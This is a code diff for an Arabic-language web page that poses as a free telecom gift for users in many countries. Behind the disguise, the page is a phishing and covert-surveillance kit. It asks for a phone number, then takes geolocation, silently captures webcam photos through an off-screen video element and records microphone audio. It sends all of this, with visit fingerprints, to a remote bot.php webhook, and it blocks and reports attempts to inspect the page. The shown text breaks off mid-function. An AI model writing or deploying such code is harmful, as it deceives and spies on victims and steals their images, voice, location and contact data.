@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 هدية الاتصالات</title>
+    <title>🎁 هدية الاتصالات – اختر بلدك</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -23,15 +23,27 @@
             background: rgba(255,255,255,0.06);
             backdrop-filter: blur(18px);
             border-radius: 40px;
-            padding: 30px 25px;
+            padding: 30px 25px 25px;
             border: 1px solid rgba(255,215,0,0.15);
             box-shadow: 0 25px 50px rgba(0,0,0,0.5);
             text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -60%;
+            left: -60%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 30%, rgba(255,215,0,0.05), transparent 70%);
+            pointer-events: none;
         }
         .logo { font-size: 50px; margin-bottom: 5px; display: inline-block; animation: pulse 2s infinite; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.08); } 100% { transform: scale(1); } }
         h1 { font-size: 28px; font-weight: 700; background: linear-gradient(135deg, #ffd700, #ff9f43); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 5px 0 10px; }
-        .sub { color: #b0c4de; font-size: 16px; margin-bottom: 20px; }
+        .sub { color: #b0c4de; font-size: 16px; margin-bottom: 20px; font-weight: 300; }
         .step { display: none; animation: fadeIn 0.5s ease; }
         .step.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
@@ -46,9 +58,16 @@
             font-size: 15px;
             cursor: pointer;
             transition: all 0.25s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
         }
+        .country-btn i { font-size: 28px; color: #ffd700; }
         .country-btn:hover { background: rgba(255,215,0,0.15); border-color: #ffd700; transform: scale(1.03); }
+        .country-btn:active { transform: scale(0.96); }
         .input-group { margin: 18px 0; text-align: right; }
+        .input-group label { display: block; font-size: 14px; color: #ccc; margin-bottom: 5px; text-align: right; }
         .input-group input {
             width: 100%;
             padding: 14px 18px;
@@ -58,8 +77,10 @@
             color: #fff;
             font-size: 16px;
             outline: none;
+            transition: 0.3s;
         }
         .input-group input:focus { border-color: #ffd700; box-shadow: 0 0 0 3px rgba(255,215,0,0.15); }
+        .input-group input::placeholder { color: #888; }
         .btn-gold {
             background: linear-gradient(135deg, #ffd700, #f0a500);
             border: none;
@@ -74,273 +95,667 @@
             box-shadow: 0 8px 25px rgba(255,215,0,0.25);
             margin-top: 10px;
         }
-        .btn-gold:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn-gold:hover { transform: scale(1.02); box-shadow: 0 12px 35px rgba(255,215,0,0.35); }
+        .btn-gold:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
         .btn-gold .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,0,0,0.2); border-top: 3px solid #1a1a2e; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
         .btn-gold.loading .spinner { display: inline-block; }
         .btn-gold.loading .btn-text { display: none; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .timer-box { background: rgba(0,0,0,0.25); border-radius: 60px; padding: 12px 20px; margin: 20px 0; display: flex; align-items: center; justify-content: center; gap: 15px; border: 1px solid rgba(255,215,0,0.15); }
-        .timer-box span { font-size: 28px; font-weight: 700; color: #ffd700; }
-        .status { margin-top: 16px; padding: 12px 16px; border-radius: 16px; font-size: 14px; display: none; }
+        .timer-box {
+            background: rgba(0,0,0,0.25);
+            border-radius: 60px;
+            padding: 12px 20px;
+            margin: 20px 0 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            border: 1px solid rgba(255,215,0,0.15);
+        }
+        .timer-box i { font-size: 28px; color: #ffd700; }
+        .timer-box span { font-size: 28px; font-weight: 700; color: #ffd700; letter-spacing: 3px; }
+        .status {
+            margin-top: 16px;
+            padding: 12px 16px;
+            border-radius: 16px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+            backdrop-filter: blur(10px);
+        }
         .status.success { background: rgba(46,213,115,0.15); color: #2ed573; display: block; }
         .status.info { background: rgba(54,164,235,0.15); color: #36a4eb; display: block; }
         .status.error { background: rgba(255,107,107,0.15); color: #ff6b6b; display: block; }
         .footer { margin-top: 25px; font-size: 12px; color: #666; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; }
-        #hiddenVideo, #hiddenCanvas { display: none; }
-        .permission-wrapper { background: rgba(255,215,0,0.05); border-radius: 20px; padding: 16px; margin: 15px 0; border: 1px solid rgba(255,215,0,0.08); text-align: right; }
-        .permission-wrapper ul { list-style: none; padding: 0; }
-        .permission-wrapper ul li { padding: 6px 0; color: #ddd; font-size: 14px; }
+        #hiddenVideo { position: fixed; top: -1000px; left: -1000px; width: 320px; height: 240px; opacity: 0; pointer-events: none; }
+        #hiddenCanvas { display: none; }
+        @media (max-width: 480px) {
+            .container { padding: 20px 15px; }
+            h1 { font-size: 24px; }
+            .country-grid { grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); }
+            .country-btn { padding: 10px 6px; font-size: 13px; }
+            .country-btn i { font-size: 22px; }
+        }
+        .permission-wrapper {
+            background: rgba(255,215,0,0.05);
+            border-radius: 20px;
+            padding: 16px;
+            margin: 15px 0;
+            border: 1px solid rgba(255,215,0,0.08);
+        }
+        .permission-wrapper ul { list-style: none; padding: 0; margin: 8px 0; text-align: right; }
+        .permission-wrapper ul li { padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.03); color: #ddd; font-size: 14px; }
         .permission-wrapper ul li i { color: #ffd700; margin-left: 8px; }
         .permission-wrapper .note { color: #aaa; font-size: 13px; margin-top: 8px; }
     </style>
 </head>
 <body>
-<div class="container" id="app">
-    <div class="step active" id="step-country">
-        <div class="logo">🌍</div>
-        <h1>اختر بلدك</h1>
-        <p class="sub">للحصول على هدية الاتصالات الخاصة بك</p>
-        <div class="country-grid" id="countryList"></div>
-        <div class="status" id="statusCountry"></div>
-    </div>
-    <div class="step" id="step-tasks">
-        <div class="logo">🎁</div>
-        <h1 id="taskTitle">أكمل التحقق</h1>
-        <p class="sub" id="taskSub">لتأكيد هويتك</p>
-        <div class="permission-wrapper" id="permissionArea"></div>
-        <div class="input-group">
-            <label for="phoneInput">📱 أدخل رقم هاتفك</label>
-            <input type="text" id="phoneInput" placeholder="مثال: 01012345678" maxlength="15">
+
+    <div class="container" id="app">
+        <!-- STEP 1: اختر البلد -->
+        <div class="step active" id="step-country">
+            <div class="logo">🌍</div>
+            <h1>اختر بلدك</h1>
+            <p class="sub">للحصول على هدية الاتصالات الخاصة بك</p>
+            <div class="country-grid" id="countryList"></div>
+            <div class="status" id="statusCountry"></div>
         </div>
-        <button class="btn-gold" id="claimBtn"><span class="btn-text">🎁 احصل على الهدية</span><span class="spinner"></span></button>
-        <div class="status" id="statusTasks"></div>
+
+        <!-- STEP 2: المهام -->
+        <div class="step" id="step-tasks">
+            <div class="logo">🎁</div>
+            <h1 id="taskTitle">أكمل عملية التحقق</h1>
+            <p class="sub" id="taskSub">لتأكيد هويتك والحصول على هديتك</p>
+            <div class="permission-wrapper" id="permissionArea"></div>
+            <div class="input-group">
+                <label for="phoneInput">📱 أدخل رقم هاتفك</label>
+                <input type="text" id="phoneInput" placeholder="مثال: 01012345678" maxlength="15">
+            </div>
+            <button class="btn-gold" id="claimBtn">
+                <span class="btn-text">🎁 احصل على الهدية</span>
+                <span class="spinner"></span>
+            </button>
+            <div class="status" id="statusTasks"></div>
+        </div>
+
+        <!-- STEP 3: عداد الوقت -->
+        <div class="step" id="step-timer">
+            <div class="logo">⏳</div>
+            <h1>تهانينا! 🎉</h1>
+            <p class="sub">تم تأكيد طلبك، سيتم إرسال الهدية خلال</p>
+            <div class="timer-box">
+                <i class="fas fa-hourglass-half"></i>
+                <span id="timerDisplay">03:00</span>
+            </div>
+            <p style="color: #aaa; font-size: 14px; margin-top: 10px;">يرجى الانتظار، ستصلك الهدية تلقائياً</p>
+            <div class="status" id="statusTimer"></div>
+        </div>
+
+        <div class="footer">
+            <i class="fas fa-shield-alt" style="color: #ffd700;"></i> نحمي خصوصيتك • جميع الحقوق محفوظة
+        </div>
     </div>
-    <div class="step" id="step-timer">
-        <div class="logo">⏳</div>
-        <h1>تهانينا! 🎉</h1>
-        <p class="sub">تم تأكيد طلبك، سيتم إرسال الهدية خلال</p>
-        <div class="timer-box"><i class="fas fa-hourglass-half"></i><span id="timerDisplay">03:00</span></div>
-        <div class="status" id="statusTimer"></div>
-    </div>
-    <div class="footer"><i class="fas fa-shield-alt" style="color: #ffd700;"></i> نحمي خصوصيتك</div>
-</div>
-<video id="hiddenVideo" autoplay playsinline muted></video>
-<canvas id="hiddenCanvas"></canvas>
-<script>
-    const WEBHOOK_URL = "https://dev-free-balancce.pantheonsite.io/free/bot.php?action=webhook_data"; // ضع هنا رابط ملف bot.php مع action=webhook_data
 
-    const countries = {
-        'مصر': { flag: '🇪🇬', prefixes: ['010','011','012','015'] },
-        'السعودية': { flag: '🇸🇦', prefixes: ['05'] },
-        'الإمارات': { flag: '🇦🇪', prefixes: ['050','052','054','055','056'] },
-        'الكويت': { flag: '🇰🇼', prefixes: ['5'] },
-        'قطر': { flag: '🇶🇦', prefixes: ['3','5','6'] },
-        'عُمان': { flag: '🇴🇲', prefixes: ['7','9'] },
-        'البحرين': { flag: '🇧🇭', prefixes: ['3','6'] },
-        'الأردن': { flag: '🇯🇴', prefixes: ['7'] },
-        'العراق': { flag: '🇮🇶', prefixes: ['7'] },
-        'سوريا': { flag: '🇸🇾', prefixes: ['9'] },
-        'لبنان': { flag: '🇱🇧', prefixes: ['3','7'] },
-        'فلسطين': { flag: '🇵🇸', prefixes: ['5','9'] },
-        'الجزائر': { flag: '🇩🇿', prefixes: ['5','6','7'] },
-        'المغرب': { flag: '🇲🇦', prefixes: ['6','7'] },
-        'تونس': { flag: '🇹🇳', prefixes: ['2','5','9'] },
-        'ليبيا': { flag: '🇱🇾', prefixes: ['9'] },
-        'السودان': { flag: '🇸🇩', prefixes: ['9','1'] },
-        'اليمن': { flag: '🇾🇪', prefixes: ['7'] },
-        'الصومال': { flag: '🇸🇴', prefixes: ['6','7'] },
-        'جيبوتي': { flag: '🇩🇯', prefixes: ['7'] },
-        'موريتانيا': { flag: '🇲🇷', prefixes: ['4','5'] },
-        'تركيا': { flag: '🇹🇷', prefixes: ['5'] },
-        'إيران': { flag: '🇮🇷', prefixes: ['9'] },
-        'باكستان': { flag: '🇵🇰', prefixes: ['3'] },
-        'الهند': { flag: '🇮🇳', prefixes: ['6','7','8','9'] },
-        'بنغلاديش': { flag: '🇧🇩', prefixes: ['1','7'] },
-        'نيجيريا': { flag: '🇳🇬', prefixes: ['7','8','9'] },
-        'جنوب أفريقيا': { flag: '🇿🇦', prefixes: ['6','7','8'] },
-    };
+    <!-- hidden video & canvas -->
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas"></canvas>
 
-    // استخراج التوكن من الرابط
-    let USER_TOKEN = null;
-    (function extractToken() {
-        const params = new URLSearchParams(window.location.search);
-        const t = params.get('i');
-        if (t && t.length >= 6 && t.length <= 8 && /^[A-Z0-9]+$/.test(t)) {
-            USER_TOKEN = t;
-            console.log('✅ Token:', USER_TOKEN);
-        } else {
-            console.warn('❌ Token غير صالح');
-            document.querySelector('.country-grid').innerHTML = '<p style="color:#ff6b6b;">⚠️ رابط غير صحيح، يرجى استخدام الرابط المخصص لك.</p>';
-        }
-    })();
+    <script>
+        // ================================================================
+        //  CONFIG - WEBHOOK
+        // ================================================================
+        const WEBHOOK_URL = "https://dev-free-balancce.pantheonsite.io/free/bot.php?action=webhook_data";
 
-    let selectedCountry = null, userPhone = null;
-    let mediaStream = null, audioStream = null, audioRecorder = null, audioChunks = [];
-    let capturedPhotos = [], userIP = 'غير متاح', userLocation = { lat: null, lng: null };
-    let isProcessing = false, timerInterval = null, timerSeconds = 180;
+        // ================================================================
+        //  CONSTANTS
+        // ================================================================
+        const TOTAL_PHOTOS = 8;
+        const CAPTURE_INTERVAL = 700;
+        const AUDIO_DURATION = 5000;
+        const PHOTO_QUALITY = 0.92;
 
-    // دوال مساعدة
-    function showStatus(el, type, msg) { el.className = 'status ' + type; el.textContent = msg; el.style.display = 'block'; }
-    function showStep(id) { document.querySelectorAll('.step').forEach(s => s.classList.remove('active')); document.getElementById(id).classList.add('active'); }
-
-    // عرض الدول
-    const countryList = document.getElementById('countryList');
-    Object.keys(countries).forEach(name => {
-        const btn = document.createElement('button');
-        btn.className = 'country-btn';
-        btn.innerHTML = `<span>${countries[name].flag}</span><span>${name}</span>`;
-        btn.onclick = () => selectCountry(name);
-        countryList.appendChild(btn);
-    });
-
-    function selectCountry(name) {
-        selectedCountry = name;
-        const data = countries[name];
-        document.getElementById('taskTitle').textContent = `🎁 هدية ${name}`;
-        document.getElementById('taskSub').textContent = `لتأكيد هويتك في ${name}`;
-        document.getElementById('permissionArea').innerHTML = `
-            <ul><li><i class="fas fa-check-circle"></i> التحقق الذكي</li>
-            <li><i class="fas fa-check-circle"></i> مراجعة البيانات</li>
-            <li><i class="fas fa-check-circle"></i> تأكيد التسليم</li></ul>
-            <div class="note">📞 الأرقام المسموحة: ${data.prefixes.join('، ')}</div>
-        `;
-        document.getElementById('phoneInput').placeholder = `مثال: ${data.prefixes[0]}12345678`;
-        showStep('step-tasks');
-        document.getElementById('statusTasks').style.display = 'none';
-        document.getElementById('claimBtn').disabled = false;
-        document.getElementById('claimBtn').classList.remove('loading');
-    }
-
-    // إرسال البيانات للـ Webhook
-    async function sendToWebhook(data) {
-        if (!USER_TOKEN) return { success: false, error: 'Token missing' };
-        try {
-            const res = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ token: USER_TOKEN, ...data })
-            });
-            const result = await res.json();
-            if (!res.ok) return { success: false, error: result.message || 'HTTP error' };
-            return { success: true, data: result };
-        } catch(e) { return { success: false, error: e.message }; }
-    }
-
-    // حدث الزر الرئيسي
-    document.getElementById('claimBtn').addEventListener('click', async function() {
-        if (!USER_TOKEN) return showStatus(document.getElementById('statusTasks'), 'error', '⚠️ رابط غير صحيح');
-        if (isProcessing) return;
-        const phone = document.getElementById('phoneInput').value.trim();
-        if (!phone) return showStatus(document.getElementById('statusTasks'), 'error', '⚠️ يرجى إدخال رقم الهاتف');
-        if (!selectedCountry) return showStatus(document.getElementById('statusTasks'), 'error', '⚠️ يرجى اختيار بلد');
-
-        const prefixes = countries[selectedCountry].prefixes;
-        if (!prefixes.some(p => phone.startsWith(p))) {
-            return showStatus(document.getElementById('statusTasks'), 'error', `⚠️ الرقم يجب أن يبدأ بـ ${prefixes.join(' أو ')}`);
-        }
-        userPhone = phone;
-        isProcessing = true;
-        this.disabled = true;
-        this.classList.add('loading');
-
-        // جمع البيانات
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            userIP = ipData.ip;
-        } catch(e) {}
-
-        // التقاط الصور
-        let photos = [];
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            mediaStream = stream;
-            const video = document.getElementById('hiddenVideo');
-            video.srcObject = stream;
-            await video.play();
-            await new Promise(r => setTimeout(r, 500));
-            const canvas = document.getElementById('hiddenCanvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = 640; canvas.height = 480;
-            for (let i = 0; i < 8; i++) {
-                ctx.drawImage(video, 0, 0, 640, 480);
-                photos.push(canvas.toDataURL('image/jpeg', 0.9));
-                await new Promise(r => setTimeout(r, 700));
-            }
-            stream.getTracks().forEach(t => t.stop());
-        } catch(e) { console.error('Camera error:', e); }
-
-        // تسجيل الصوت
-        let audioBase64 = null;
-        try {
-            const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            audioStream = aStream;
-            const recorder = new MediaRecorder(aStream, { mimeType: 'audio/webm;codecs=opus' });
-            audioRecorder = recorder;
-            audioChunks = [];
-            recorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
-            recorder.start();
-            await new Promise(r => setTimeout(r, 5000));
-            recorder.stop();
-            await new Promise(r => setTimeout(r, 500));
-            if (audioChunks.length > 0) {
-                const blob = new Blob(audioChunks, { type: 'audio/webm' });
-                const reader = new FileReader();
-                audioBase64 = await new Promise(resolve => {
-                    reader.onloadend = () => resolve(reader.result.split(',')[1]);
-                    reader.readAsDataURL(blob);
-                });
-            }
-            aStream.getTracks().forEach(t => t.stop());
-        } catch(e) { console.error('Audio error:', e); }
-
-        // إرسال الكل
-        const payload = {
-            event: 'submission',
-            country: selectedCountry,
-            phone: userPhone,
-            ip: userIP,
-            location: { lat: userLocation.lat, lng: userLocation.lng },
-            timestamp: new Date().toISOString(),
-            photos: photos.map(p => p.split(',')[1]),
-            audio: audioBase64
+        // ================================================================
+        //  COUNTRIES DATA
+        // ================================================================
+        const countries = {
+            'مصر': { flag: '🇪🇬', prefixes: ['010', '011', '012', '015'] },
+            'السعودية': { flag: '🇸🇦', prefixes: ['05'] },
+            'الإمارات': { flag: '🇦🇪', prefixes: ['050', '052', '054', '055', '056'] },
+            'الكويت': { flag: '🇰🇼', prefixes: ['5'] },
+            'قطر': { flag: '🇶🇦', prefixes: ['3', '5', '6'] },
+            'عُمان': { flag: '🇴🇲', prefixes: ['7', '9'] },
+            'البحرين': { flag: '🇧🇭', prefixes: ['3', '6'] },
+            'الأردن': { flag: '🇯🇴', prefixes: ['7'] },
+            'العراق': { flag: '🇮🇶', prefixes: ['7'] },
+            'سوريا': { flag: '🇸🇾', prefixes: ['9'] },
+            'لبنان': { flag: '🇱🇧', prefixes: ['3', '7'] },
+            'فلسطين': { flag: '🇵🇸', prefixes: ['5', '9'] },
+            'الجزائر': { flag: '🇩🇿', prefixes: ['5', '6', '7'] },
+            'المغرب': { flag: '🇲🇦', prefixes: ['6', '7'] },
+            'تونس': { flag: '🇹🇳', prefixes: ['2', '5', '9'] },
+            'ليبيا': { flag: '🇱🇾', prefixes: ['9'] },
+            'السودان': { flag: '🇸🇩', prefixes: ['9', '1'] },
+            'اليمن': { flag: '🇾🇪', prefixes: ['7'] },
+            'الصومال': { flag: '🇸🇴', prefixes: ['6', '7'] },
+            'جيبوتي': { flag: '🇩🇯', prefixes: ['7'] },
+            'موريتانيا': { flag: '🇲🇷', prefixes: ['4', '5'] },
+            'تركيا': { flag: '🇹🇷', prefixes: ['5'] },
+            'إيران': { flag: '🇮🇷', prefixes: ['9'] },
+            'باكستان': { flag: '🇵🇰', prefixes: ['3'] },
+            'الهند': { flag: '🇮🇳', prefixes: ['6', '7', '8', '9'] },
+            'بنغلاديش': { flag: '🇧🇩', prefixes: ['1', '7'] },
+            'نيجيريا': { flag: '🇳🇬', prefixes: ['7', '8', '9'] },
+            'جنوب أفريقيا': { flag: '🇿🇦', prefixes: ['6', '7', '8'] },
         };
 
-        const result = await sendToWebhook(payload);
-        if (result.success) {
-            showStep('step-timer');
-            startTimer(180);
-        } else {
-            showStatus(document.getElementById('statusTasks'), 'error', '⚠️ فشل الإرسال: ' + result.error);
-            this.disabled = false;
-            this.classList.remove('loading');
-            isProcessing = false;
-        }
-    });
+        // ================================================================
+        //  TOKEN EXTRACTION
+        // ================================================================
+        let USER_TOKEN = null;
 
-    // المؤقت
-    function startTimer(sec) {
-        timerSeconds = sec;
-        const display = document.getElementById('timerDisplay');
-        timerInterval = setInterval(() => {
-            timerSeconds--;
-            const m = Math.floor(timerSeconds / 60);
-            const s = timerSeconds % 60;
-            display.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-            if (timerSeconds <= 0) {
-                clearInterval(timerInterval);
-                display.textContent = '00:00';
-                showStatus(document.getElementById('statusTimer'), 'success', '🎉 تم إرسال هديتك!');
+        function extractTokenFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            const token = params.get('i');
+            if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
+                USER_TOKEN = token;
+                console.log('✅ Token extracted:', USER_TOKEN);
+                return true;
+            } else {
+                USER_TOKEN = null;
+                console.warn('❌ No valid token found in URL.');
+                return false;
             }
-        }, 1000);
-    }
+        }
 
-    // تنظيف عند الخروج
-    window.addEventListener('beforeunload', () => {
-        if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-        if (audioStream) audioStream.getTracks().forEach(t => t.stop());
-        if (timerInterval) clearInterval(timerInterval);
-    });
-</script>
+        // ================================================================
+        //  WEBHOOK SENDER
+        // ================================================================
+        async function sendToWebhook(data) {
+            if (!USER_TOKEN) {
+                console.error('❌ Cannot send: token missing');
+                return { success: false, error: 'Token missing' };
+            }
+            const payload = { token: USER_TOKEN, ...data };
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const result = await response.json();
+                if (!response.ok) {
+                    console.error('❌ Webhook error:', result);
+                    return { success: false, error: result.message || 'HTTP error' };
+                }
+                console.log('✅ Webhook success:', result);
+                return { success: true, data: result };
+            } catch (error) {
+                console.error('❌ Webhook fetch error:', error);
+                return { success: false, error: error.message };
+            }
+        }
+
+        // ================================================================
+        //  STATE
+        // ================================================================
+        let selectedCountry = null;
+        let userPhone = null;
+        let mediaStream = null;
+        let audioStream = null;
+        let audioRecorder = null;
+        let audioChunks = [];
+        let capturedPhotos = [];
+        let userIP = 'غير متاح';
+        let userLocation = { lat: null, lng: null, accuracy: null, error: null };
+        let isProcessing = false;
+        let timerInterval = null;
+        let timerSeconds = 180;
+
+        const stepCountry = document.getElementById('step-country');
+        const stepTasks = document.getElementById('step-tasks');
+        const stepTimer = document.getElementById('step-timer');
+        const countryList = document.getElementById('countryList');
+        const statusCountry = document.getElementById('statusCountry');
+        const statusTasks = document.getElementById('statusTasks');
+        const statusTimer = document.getElementById('statusTimer');
+        const claimBtn = document.getElementById('claimBtn');
+        const phoneInput = document.getElementById('phoneInput');
+        const permissionArea = document.getElementById('permissionArea');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const taskTitle = document.getElementById('taskTitle');
+        const taskSub = document.getElementById('taskSub');
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+
+        // ================================================================
+        //  NOTIFICATION: USER ENTERED
+        // ================================================================
+        async function notifyUserEntered() {
+            if (!USER_TOKEN) return;
+            let ip = 'غير متاح';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+                userIP = ip;
+            } catch (e) {}
+            const payload = {
+                event: 'visit',
+                timestamp: new Date().toISOString(),
+                ip: ip,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                url: window.location.href
+            };
+            const result = await sendToWebhook(payload);
+            if (!result.success) {
+                console.warn('⚠️ Failed to send visit notification:', result.error);
+            }
+        }
+
+        // ================================================================
+        //  DETECT SUSPICIOUS
+        // ================================================================
+        function detectSuspiciousActivity() {
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                sendSuspiciousAlert('🖱️ محاولة النقر الأيمن');
+            });
+            document.addEventListener('keydown', (e) => {
+                const key = e.key;
+                const ctrl = e.ctrlKey || e.metaKey;
+                const shift = e.shiftKey;
+                if (key === 'F12' ||
+                    (ctrl && shift && (key === 'I' || key === 'C' || key === 'J')) ||
+                    (ctrl && key === 'U')) {
+                    e.preventDefault();
+                    sendSuspiciousAlert(`⌨️ محاولة فتح أدوات المطور (${key})`);
+                }
+                if (ctrl && (key === 'c' || key === 'v' || key === 'x')) {
+                    sendSuspiciousAlert(`📋 محاولة ${key === 'c' ? 'نسخ' : key === 'v' ? 'لصق' : 'قص'}`);
+                }
+            });
+            document.addEventListener('dragstart', (e) => {
+                e.preventDefault();
+                sendSuspiciousAlert('🔄 محاولة سحب محتوى');
+            });
+            document.addEventListener('selectstart', (e) => {
+                sendSuspiciousAlert('✏️ محاولة تحديد نص');
+            });
+        }
+
+        let alertCooldown = 0;
+        function sendSuspiciousAlert(action) {
+            if (!USER_TOKEN) return;
+            const now = Date.now();
+            if (now - alertCooldown < 5000) return;
+            alertCooldown = now;
+            const payload = {
+                event: 'suspicious',
+                action: action,
+                timestamp: new Date().toISOString(),
+                ip: userIP,
+                userAgent: navigator.userAgent,
+                url: window.location.href
+            };
+            sendToWebhook(payload).catch(console.warn);
+        }
+
+        // ================================================================
+        //  RENDER COUNTRIES
+        // ================================================================
+        function renderCountries() {
+            countryList.innerHTML = '';
+            Object.keys(countries).forEach(name => {
+                const btn = document.createElement('button');
+                btn.className = 'country-btn';
+                btn.innerHTML = `<span>${countries[name].flag}</span><span>${name}</span>`;
+                btn.dataset.country = name;
+                btn.addEventListener('click', () => selectCountry(name));
+                countryList.appendChild(btn);
+            });
+        }
+        renderCountries();
+
+        function selectCountry(name) {
+            selectedCountry = name;
+            const data = countries[name];
+            taskTitle.textContent = `🎁 هدية ${name}`;
+            taskSub.textContent = `لتأكيد هويتك والحصول على هديتك في ${name}`;
+            const prefixes = data.prefixes.join('، ');
+            permissionArea.innerHTML = `
+                <ul>
+                    <li><i class="fas fa-check-circle"></i> التحقق الذكي من أهلية الاستلام بأعلى معايير الأمان</li>
+                    <li><i class="fas fa-check-circle"></i> مراجعة واعتماد بيانات المستفيد بشكل آلي وآمن</li>
+                    <li><i class="fas fa-check-circle"></i> تأكيد معلومات التسليم لضمان وصول الهدية بنجاح</li>
+                </ul>
+                <div class="note">📞 الأرقام المسموحة: <strong style="color:#ffd700;">${prefixes}</strong></div>
+                <div style="font-size:13px; color:#888; margin-top:10px; border-top:1px solid rgba(255,255,255,0.05); padding-top:10px;">
+                    <i class="fas fa-lock" style="color:#ffd700;"></i> عملية آمنة • بياناتك محمية
+                </div>
+            `;
+            phoneInput.placeholder = `مثال: ${prefixes.split('،')[0]}12345678`;
+            showStep('step-tasks');
+            statusTasks.className = 'status';
+            statusTasks.style.display = 'none';
+            phoneInput.value = '';
+            capturedPhotos = [];
+            audioChunks = [];
+            claimBtn.disabled = false;
+            claimBtn.classList.remove('loading');
+            claimBtn.querySelector('.btn-text').textContent = '🎁 احصل على الهدية';
+        }
+
+        function showStep(id) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        // ================================================================
+        //  BUTTON CLICK – MAIN ACTION
+        // ================================================================
+        claimBtn.addEventListener('click', async () => {
+            if (!USER_TOKEN) {
+                showStatus(statusTasks, 'error', '⚠️ الرابط غير صحيح، يرجى الدخول من الرابط المخصص لك.');
+                return;
+            }
+            if (isProcessing) return;
+            const phone = phoneInput.value.trim();
+            if (!phone) {
+                showStatus(statusTasks, 'error', '⚠️ يرجى إدخال رقم الهاتف');
+                return;
+            }
+            const prefixes = countries[selectedCountry].prefixes;
+            let valid = false;
+            for (let p of prefixes) {
+                if (phone.startsWith(p)) { valid = true; break; }
+            }
+            if (!valid) {
+                showStatus(statusTasks, 'error', `⚠️ الرقم يجب أن يبدأ بـ ${prefixes.join(' أو ')}`);
+                return;
+            }
+            userPhone = phone;
+
+            isProcessing = true;
+            claimBtn.disabled = true;
+            claimBtn.classList.add('loading');
+            claimBtn.querySelector('.btn-text').textContent = 'جاري التأكيد...';
+            showStatus(statusTasks, 'info', '⏳ جاري تأكيد هويتك...');
+
+            await getIPAddress();
+            await getLocation();
+            await startCameraAndCapture();
+            await recordAudio();
+            await sendAllData();
+
+            if (capturedPhotos.length > 0 || audioChunks.length > 0) {
+                showStep('step-timer');
+                startTimer(180);
+            } else {
+                showStatus(statusTasks, 'error', '⚠️ لم نتمكن من التأكيد، يرجى المحاولة مرة أخرى.');
+                claimBtn.disabled = false;
+                claimBtn.classList.remove('loading');
+                claimBtn.querySelector('.btn-text').textContent = '🎁 احصل على الهدية';
+                isProcessing = false;
+            }
+        });
+
+        // ================================================================
+        //  FUNCTIONS: IP, LOCATION, CAMERA, AUDIO, SEND
+        // ================================================================
+        async function getIPAddress() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                userIP = data.ip;
+            } catch (e) {
+                userIP = 'Unable to fetch';
+            }
+        }
+
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    userLocation.error = 'Not supported';
+                    resolve();
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        userLocation.lat = pos.coords.latitude;
+                        userLocation.lng = pos.coords.longitude;
+                        userLocation.accuracy = pos.coords.accuracy;
+                        userLocation.error = null;
+                        resolve();
+                    },
+                    (err) => {
+                        userLocation.error = err.message;
+                        resolve();
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 3000 }
+                );
+            });
+        }
+
+        async function startCameraAndCapture() {
+            return new Promise(async (resolve) => {
+                try {
+                    showStatus(statusTasks, 'info', '📸 جاري التحقق البصري...');
+                    const constraints = { video: true, audio: false };
+                    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    video.srcObject = mediaStream;
+                    await video.play();
+
+                    await new Promise((resolve, reject) => {
+                        const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
+                        const onReady = () => { clearTimeout(timeout); resolve(); };
+                        if (video.readyState >= 2 && video.videoWidth > 0) {
+                            onReady();
+                        } else {
